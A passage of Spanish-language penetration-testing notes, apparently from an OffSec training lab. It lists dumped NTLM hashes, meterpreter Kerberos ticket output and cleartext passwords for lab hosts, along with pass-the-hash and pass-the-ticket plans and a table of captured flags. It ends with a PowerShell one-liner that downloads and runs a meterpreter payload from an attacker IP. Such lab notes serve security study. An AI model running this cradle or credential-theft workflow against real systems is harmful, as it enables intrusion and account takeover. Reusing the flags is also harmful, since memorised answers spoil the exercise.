Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:cf998001c44803b490a46f363a2ca812:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:030b83437fa120c80e8d06967d8fad82:::

meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:11:09 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : krbtgt/RELIA.COM @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:10:09 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : krbtgt/RELIA.COM @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:11:09 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : cifs/DC02.relia.com/relia.com @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:11:09 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : WK02$ @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:10:16 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : LDAP/DC02.relia.com @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/16/2025 6:10:09 AM ; 7/16/2025 4:10:09 PM ; 7/23/2025 6:10:09 AM
   Server Name       : ldap/DC02.relia.com/relia.com @ RELIA.COM
   Client Name       : wk02$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

```

#### Informacion ordenada:

| Usuario                          | NTLM Hash                                                                               | Password   | Tickets Kerberos                                                                           | Posibles vectores recomendados                                         |
| -------------------------------- | --------------------------------------------------------------------------------------- | ---------- | ------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| **Administrator**                | d8aa69abd669a0d0ffe02ae095a4e301                                                        | (null)     | No listado                                                                                 | PTH para SYSTEM local o en otros hosts del dominio                     |
| **jim (RELIA)**                  | be5cb823ee026304b6ed0cd356e34a3c                                                        | (null)     | No listado expl√≠cito (podr√≠as exportar)                                                    | PTH para movimiento lateral; intento crack para pass real              |
| **offsec (WK01)**                | a6e162b0429f0ff6cee42809a01fd49d                                                        | (null)     | No listado expl√≠cito (podr√≠as exportar)                                                    | PTH en red; pivoting lateral                                           |
| **WK01\$ (RELIA)**               | b47d6cff1df8db23ea339d81ee762710 (antiguo)<br>aa704e701eb6532afc42350a19c329c5 (actual) | (null)     | Tickets TGT y TGS:<br>- krbtgt/RELIA.COM<br>- cifs/DC02.relia.com<br>- LDAP/DC02.relia.com | Pass-The-Ticket con `mimikatz kerberos::ptt` para pivotar como m√°quina |
| **WDAGUtilityAccount**           | (null)                                                                                  | (null)     | No listado                                                                                 | Baja prioridad, ignorable                                              |
| **DefaultPassword (LSA secret)** | (null)                                                                                  | Castello1! | (null)                                                                                     | Probar en cuentas locales, RDP, servicios, intento de escalada         |


### Tabla de credenciales

| hostname | user | NTLM | password | 
|----------|------|------|----------|
|**LEGACY**| Administrator | 387aef0561b65e4f3cae0960b0fba2d5 | [x] |
|          | adrian | e3cea06e2de8d54d43b84d4b5bffb5b0 | [x] |
|          | damon | 820d6348890893116880101307197052 | [x] |
|**WEB01/DEMO**| anita | [x] | fireball |
|**WEB02** | Administrator | 2f2b8d5d4d756a2c72c554580f970c14 | [x] |
|**EXTERNAL** | enmma | [x] | SomersetVinyl1! |
|**MAIL** | maildmz | [x] | DPuBT9tGCBrTbR |
|**LOGIN** | dmzadmin | [x] | SlimGodhoodMope |
|**WK01** | jim | be5cb823ee026304b6ed0cd356e34a3c |Castello1! |
|**INTRANET** | michelle | 18d4098c8d9ff721745b388ad4a442bf | NotMyPassword0k? |
|             | Administrator | 8b4547a5116dd13e6e206d1286a06b28 | _S111111111p0rtionze21 |
|**WK02** | andrea |ce3f12443651168b3793f5fbcccff9db | PasswordPassword_6 |
| | | |  

### Tabla de flags

| **hostname** | local | proof |
|--------------|-------|-------|
| **LEGACY**   | 6de2be6545730d15382906e9f34e3db8 | bda74c52627c3c64c3f59514ca124ed7 |
| **WEB01**    | c784533ef1e4c4f51b572cfeb22c9709 | 1e0dc9497b51bcc3f37a7dd885264cdc |
| **DEMO**     | 306c7aaf53142804b30c14605b63e057 | a4aaa27336459a518f3c2a5285ce1b9a |
| **WEB02**    | e15f6403ccd84366de829e562049787a | 90441a5c98c6c81e4668c7467d64caa6 |
| **EXTERNAL** | e2818bfe33eba3f32cca5c35abb2ca9b | 5925cfd1783c9a77d3261f4eaa663785 | 
| **LOGIN** | **null** | b10749a8ecd06e7254a0b563940c4308 | 
| **WK01**     | 78aa0e6cead90c8a1e2711df89796f01 | 5d6ab7d2f773c9b5fc5faa6c2c4459a9 | 
| **MAIL** | **null** | |
| **INTRANET** | 04328466326855d85415542f4a7a50c8 | 62d00368f2778bd44119c7fd82475603 |
| **WK02** | 7e46c8b6b4b8d782a783b7649e9a2231 | e119fecb5c80f3c460f7cda0f7d44305 |

## Troubleshooting
1. Tener el handler ya configurado y ejecutado a la hora de ejecutar el comando:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```


